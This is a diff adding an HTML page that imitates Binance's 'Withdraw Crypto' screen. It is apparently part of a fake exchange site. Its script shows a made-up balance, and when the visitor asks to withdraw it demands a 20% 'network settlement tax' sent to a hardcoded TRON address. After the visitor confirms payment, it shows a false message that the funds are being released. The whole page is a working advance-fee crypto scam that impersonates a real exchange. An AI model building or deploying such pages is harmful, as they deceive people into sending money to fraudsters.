@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#181A20">
+<title>Withdraw Crypto | Binance</title>
+<link rel="stylesheet" href="assets/26d506f1.css">
+<link rel="stylesheet" href="assets/db846df6.css">
+<link rel="stylesheet" href="assets/7532a387.css">
+<style>
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-Regular.woff2") format("woff2");font-weight:400}
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-SemiBold.woff2") format("woff2");font-weight:600 800}
+:root{--bg:#181A20;--card:#202630;--line:#333B47;--inputline:#474D57;--txt:#EAECEF;--txt2:#848E9C;--yellow:#F0B90B;--btn:#FCD535;--ontxt:#202630;--red:#F6465D;--green:#2EBD85}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:BinanceNova,Arial,sans-serif;background:var(--bg);color:var(--txt);font-size:14px;min-height:100vh}
+a{text-decoration:none;color:inherit;cursor:pointer}
+button{font-family:inherit;cursor:pointer}
+.hdr{height:64px;display:flex;align-items:center;gap:24px;padding:0 24px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:5}
+.hdr nav{display:flex;gap:22px;font-size:14px}
+.hr{margin-left:auto;display:flex;align-items:center;gap:14px}
+.av{width:28px;height:28px;border-radius:50%;background:#29313D;display:grid;place-items:center;font-size:12px;font-weight:600;text-transform:uppercase}
+main{max-width:500px;margin:0 auto;padding:28px 24px 60px}
+h1{font-size:20px;font-weight:600;margin-bottom:16px}
+.sel{width:100%;display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:8px;background:#1E2026;padding:12px 14px;height:48px;margin-bottom:22px;font-size:15px;text-align:left}
+.sel b{font-weight:600}
+.mut{color:var(--txt2)}
+.cv{margin-left:auto;color:var(--txt2)}
+.lab{display:flex;justify-content:space-between;font-size:13px;color:var(--txt2);margin-bottom:8px}
+.box{border:1px solid var(--inputline);border-radius:4px;display:flex;align-items:center;margin-bottom:20px}
+.box:focus-within{border-color:var(--yellow)}
+.box input{width:100%;height:50px;padding:6px 12px;background:transparent;border:0;outline:0;color:var(--txt);font-size:15px;font-family:inherit}
+.box .suf{padding:0 12px;color:var(--yellow);font-size:13px;cursor:pointer;flex:0 0 auto}
+.row{display:flex;justify-content:space-between;font-size:13px;color:var(--txt2);padding:6px 0}
+.row b{color:var(--txt);font-weight:500}
+.btn{width:100%;height:48px;border:0;border-radius:4px;background:var(--btn);color:var(--ontxt);font-size:15px;font-weight:600;margin-top:18px}
+.btn2{width:100%;height:48px;border:1px solid var(--inputline);border-radius:4px;background:transparent;color:var(--txt);font-size:15px;margin-top:10px}
+.warn{background:rgba(240,185,11,.1);border-radius:4px;padding:10px 12px;font-size:13px;color:var(--yellow);line-height:1.6;margin-bottom:16px}
+.err{color:var(--red);font-size:13px;margin-top:8px;display:none}
+.err.on{display:block}
+.panel{display:none;border:1px solid var(--btn);border-radius:8px;background:var(--card);padding:16px;margin-top:20px}
+.panel.on{display:block}
+.panel h3{font-size:15px;font-weight:600;margin-bottom:6px}
+.panel p{font-size:13px;color:var(--txt2);line-height:1.6;margin-bottom:12px}
+.qr{width:150px;height:150px;background:#fff;border-radius:4px;padding:6px;display:block;margin:0 auto 12px}
+.code{font-family:ui-monospace,monospace;font-size:12.5px;word-break:break-all;background:#0B0E11;border:1px solid var(--line);border-radius:4px;padding:10px;margin-bottom:10px}
+.amt{font-size:20px;font-weight:600;color:var(--yellow);text-align:center;margin-bottom:10px}
+.ok{display:none;background:rgba(46,189,133,.1);border:1px solid var(--green);color:var(--green);border-radius:6px;padding:12px;font-size:13px;line-height:1.6;margin-top:18px}
+.ok.on{display:block}
+</style></head><body>
+<div class="hdr">
+<a href="index.html"><svg height="24" width="120" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg></a>
+<nav><a>Buy Crypto</a><a>Markets</a><a>Trade</a><a>Earn</a></nav>
+<div class="hr"><a href="deposit.html" style="font-size:13px;color:var(--txt2)">Deposit</a><div class="av" id="av">U</div></div>
+</div>
+<main>
+<h1>Withdraw Crypto</h1>
+<div class="sel"><svg width="20" height="20" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26A17B"></circle><path fill="#fff" d="M17.9 14.1v-2h5.2V9H8.9v3.1h5.2v2c-4.2.2-7.4 1-7.4 2s3.2 1.8 7.4 2v7.1h3.8v-7.1c4.2-.2 7.4-1 7.4-2s-3.2-1.8-7.4-2zm0 3.4v-.9c-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1v.9c-3.5-.3-6.1-.9-6.1-1.5s2.6-1.2 6.1-1.5v.9c.6.1 1.2.1 1.9.1s1.3 0 1.9-.1v-.9c3.5.3 6.1.9 6.1 1.5s-2.6 1.2-6.1 1.5z"></path></svg><b>USDT</b><span class="cv">▾</span></div>
+<div class="sel"><b>TRON</b><span class="mut">Tron (TRC20)</span><span class="cv">▾</span></div>
+<div class="lab"><span>Address</span><span style="color:var(--txt2)">Manage ›</span></div>
+<div class="box"><input id="waddr" placeholder="Enter TRC20 address"></div>
+<div class="lab"><span>Amount</span><span style="color:var(--yellow)" onclick="maxit()">Max</span></div>
+<div class="box"><input id="wamt" type="number" placeholder="Enter amount"><span class="suf" id="cur">USDT</span></div>
+<div class="row"><span>Available</span><b id="avail">0.00 USDT</b></div>
+<div class="row"><span>Network fee</span><b>1 USDT</b></div>
+<div class="row"><span>You will receive</span><b id="recv">0.00 USDT</b></div>
+<div class="err" id="e1"></div>
+<button class="btn" onclick="req()">Request Withdrawal</button>
+<div class="panel" id="tax">
+<h3>Settlement required</h3>
+<p>A network settlement tax of <b id="taxpct">20%</b> must be paid before your withdrawal can be released. Send the exact amount below, then confirm.</p>
+<div class="amt" id="taxamt">0.00 USDT</div>
+<img class="qr" id="tqr" alt="Tax address QR">
+<div class="code" id="taddr"></div>
+<button class="btn2" onclick="copyTax()">Copy tax address</button>
+<button class="btn" onclick="paid()">I have paid the tax</button>
+</div>
+<div class="ok" id="ok">Withdrawal submitted. Settlement confirmed — funds are being released to your address, typically within 24–48 hours.</div>
+</main>
+<script>
+var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
+var me=localStorage.getItem("bncSess")||"";
+if(!me){location.href="login.html"}
+var S=JSON.parse(localStorage.getItem("u_"+me)||'{"bal":0,"h":{},"p":{}}');
+document.getElementById("av").textContent=(me[0]||"U");
+document.getElementById("avail").textContent=(S.bal||0).toFixed(2)+" USDT";
+document.getElementById("taddr").textContent=ADDR;
+document.getElementById("tqr").src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data="+ADDR;
+function maxit(){document.getElementById("wamt").value=(S.bal||0).toFixed(2);calc()}
+function calc(){var a=parseFloat(document.getElementById("wamt").value)||0;
+document.getElementById("recv").textContent=Math.max(0,a-1).toFixed(2)+" USDT"}
+document.getElementById("wamt").oninput=calc;
+function err(m){var e=document.getElementById("e1");e.textContent=m;e.className="err on"}
+function req(){var a=parseFloat(document.getElementById("wamt").value)||0,w=document.getElementById("waddr").value.trim();
+var k=(JSON.parse(localStorage.getItem("bncUsers")||"{}")[me]||{}).kyc;
+if(k!="verified"){err("Complete identity verification before withdrawing.");return}
+if(a<50){err("Minimum withdrawal is 50 USDT.");return}
+if(a>(S.bal||0)){err("Insufficient balance.");return}
+if(!w){err("Enter a TRC20 address.");return}
+document.getElementById("e1").className="err";
+S.bal=(S.bal||0)-a;S.wd=(S.wd||0)+1;localStorage.setItem("u_"+me,JSON.stringify(S));
+var tax=Math.max(15,a*0.2);
+document.getElementById("taxamt").textContent=tax.toFixed(2)+" USDT";
+document.getElementById("tax").classList.add("on");
+document.getElementById("tax").scrollIntoView({behavior:"smooth"})}
+function copyTax(){navigator.clipboard.writeText(ADDR)}
+function paid(){document.getElementById("tax").classList.remove("on");document.getElementById("ok").classList.add("on");
+document.getElementById("ok").scrollIntoView({behavior:"smooth"})}
+</script>
+</body></html>
